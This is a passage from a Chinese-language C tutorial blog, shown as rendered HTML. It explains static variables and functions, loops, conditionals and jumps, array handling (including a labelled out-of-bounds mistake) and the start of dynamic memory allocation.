class="number">10</span> + <span class="number">20</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum);</span><br><span class="line"><span class="type">int</span> division = Division(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, division);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>static</code> 变量的作用</p><ol><li><p>局部静态变量</p><ul><li><p><strong>生命周期</strong>：局部静态变量在程序的整个生命周期内存在，但它的作用域仅限于定义它的函数。</p></li><li><p><strong>初始化</strong>：局部静态变量在第一次进入定义它的函数时被初始化。之后，即使函数被多次调用，它们的值也会保持不变。</p></li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;  <span class="comment">// 局部静态变量</span></span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count: %d\n&quot;</span>, count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func();  <span class="comment">// 输出: count: 1</span></span><br><span class="line">    func();  <span class="comment">// 输出: count: 2</span></span><br><span class="line">    func();  <span class="comment">// 输出: count: 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>count</code> 是一个静态局部变量。它在 <code>func</code> 函数第一次被调用时初始化为 0，然后在每次调用 <code>func</code> 时递增，但不会在函数调用结束时被销毁。</p></li><li><p>全局静态变量</p><ul><li><p><strong>作用域</strong>：全局静态变量的作用域仅限于定义它的文件，不同文件中的全局静态变量互不影响。</p></li><li><p><strong>生命周期</strong>：全局静态变量在程序的整个生命周期内存在。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count = <span class="number">10</span>;  <span class="comment">// 全局静态变量</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count: %d\n&quot;</span>, count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func();  <span class="comment">// 输出: count: 11</span></span><br><span class="line">    func();  <span class="comment">// 输出: count: 12</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在这个例子中，全局静态变量 <code>count</code> 在整个程序的生命周期内存在，但它的作用域仅限于定义它的文件。</p></li></ul></li><li><p><code>static</code> 函数</p><ul><li><strong>作用域</strong>：静态函数的作用域仅限于定义它的文件，不能被其他文件中的代码调用。这有助于隐藏实现细节。</li><li><strong>生命周期</strong>：静态函数和普通函数的生命周期一样，都是在程序执行期间。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;  <span class="comment">// 静态函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a static function.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func();  <span class="comment">// 输出: This is a static function.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>func</code> 是一个静态函数，它只能在定义它的文件中调用，不能被其他文件中的代码调用。</p></li></ol><p><strong>局部静态变量</strong>：在函数中定义，作用域仅限于函数，但生命周期贯穿整个程序运行期间。</p><p><strong>全局静态变量</strong>：在文件中定义，作用域仅限于文件，但生命周期贯穿整个程序运行期间。</p><p><strong>静态函数</strong>：仅在定义它的文件中可见，有助于隐藏实现细节。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 循环-for</span></span><br><span class="line"><span class="comment">/*for (;;) &#123;</span></span><br><span class="line"><span class="comment">printf(&quot;死循环:无限循环,这条信息会一直打印下去直到手动关闭.&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="type">int</span> length = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for循环第%d次\n&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// while</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;while循环第%d次\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// i++这块需要了解自增、自减运算符</span></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// do-while</span></span><br><span class="line"><span class="comment">// do while 循环与 while 循环的主要区别在于它们执行循环体的顺序.</span></span><br><span class="line"><span class="comment">// do while 循环首先执行循环体,然后检查循环条件.</span></span><br><span class="line"><span class="comment">// 因此，即使条件一开始就为假，循环体也会至少执行一次。</span></span><br><span class="line"><span class="type">int</span> b = <span class="number">11</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;至少打印一次\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (b &lt; <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if</span></span><br><span class="line">    <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是正数\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if-else</span></span><br><span class="line">    <span class="keyword">if</span> (number % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是偶数\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是奇数\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if-else if</span></span><br><span class="line">    <span class="keyword">if</span> (number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是负数\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是零\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是正数\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch</span></span><br><span class="line">    <span class="keyword">switch</span> (number) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是 1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是 2\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是 3\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是 4\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 是 5\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;number 不是 1 到 5 之间的数\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 示例 1: 使用 break 终止循环</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;示例 1: 使用 break 终止循环\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 当 i 等于 5 时，退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环被 break 终止\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例 2: 使用 continue 跳过当前迭代</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;示例 2: 使用 continue 跳过当前迭代\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;  <span class="comment">// 跳过当前迭代（即不打印偶数）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环中 continue 用于跳过偶数\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例 3: 使用 goto 跳转</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;示例 3: 使用 goto 跳转\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">start_loop:</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> end_loop;  <span class="comment">// 当 i 等于 5 时，跳转到 end_loop 标签</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> start_loop;  <span class="comment">// 跳转回 start_loop 标签，继续循环</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">end_loop:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环被 goto 终止\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modifyArray</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteElement</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span>* size, <span class="type">int</span> index)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 声明并初始化一个整数数组</span></span><br><span class="line">    <span class="type">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印数组元素</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initial array: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 遍历数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Traversing the array:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Element at index %d: %d\n&quot;</span>, i, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 修改数组</span></span><br><span class="line">    arr[<span class="number">2</span>] = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Array after modification: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 函数中修改数组</span></span><br><span class="line">    modifyArray(arr, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Array after modifyArray function: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 删除数组元素</span></span><br><span class="line">    <span class="type">int</span> size = <span class="number">5</span>;</span><br><span class="line">    deleteElement(arr, &amp;size, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Array after deleting element at index 2: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 字符串数组的输入输出</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">    fgets(str, <span class="keyword">sizeof</span>(str), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered: %s&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 数组越界溢出示例（谨慎运行）</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Attempting out of bounds access (may result in undefined behavior):\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Out of bounds: %d\n&quot;</span>, arr[<span class="number">10</span>]);  <span class="comment">// 这里是一个故意的错误示例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 安全输出数组元素避免越界</span></span><br><span class="line">    <span class="type">int</span> safeArr[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="type">int</span> safeSize = <span class="keyword">sizeof</span>(safeArr) / <span class="keyword">sizeof</span>(safeArr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Safe array traversal: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; safeSize; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, safeArr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">modifyArray</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        arr[i] *= <span class="number">2</span>;  <span class="comment">// 将数组中每个元素的值乘以2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteElement</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span>* size, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// 移动数组元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = index; i &lt; *size - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    (*size)--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// MAX_PATH 的长度为260,也就是预留了260字节的内存,所以也可称数组为静态内存申请</span></span><br><span class="line"><span class="type">char</span> x[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;MAX_PATH: %d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(x));</span><br><span class="line">WCHAR* str = <span class="string">L&quot;aaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WCHAR: %d\n&quot;</span>, (<span class="type">int</span>)wcslen(str));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态内存申请函数</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">malloc</span></span><br><span class="line"><span class="comment">原型：extern void *malloc(unsigned int num_bytes);</span></span><br><span class="line"><span class="comment">功能：分配长度为num_bytes字节的内存块</span></span><br><span class="line"><span class="comment">说明：如果分配成功则返回指向被分配内存的指针，否则返回空指针NULL。</span></span><br><span class="line"><span class="comment">当内存不再使用时，应使用free()函数将内存块释放。 举例：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span>* buffer = <span class="built_in">malloc</span>(MAX_PATH);</span><br><span class="line"><span class="comment">// 或者用wchar接收</span></span><br><span class="line"><span class="comment">//WCHAR* buffer = malloc(MAX_PATH);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">calloc</span></span><br><span class="line"><span class="comment">原型：extern void *calloc(int num_elems, int elem_size);</span></span><br><span class="line"><span class="comment"> int elem_size:char是1个字节,wchar是2个字节,所以可以写1或者2</span></span><br><span class="line"><span 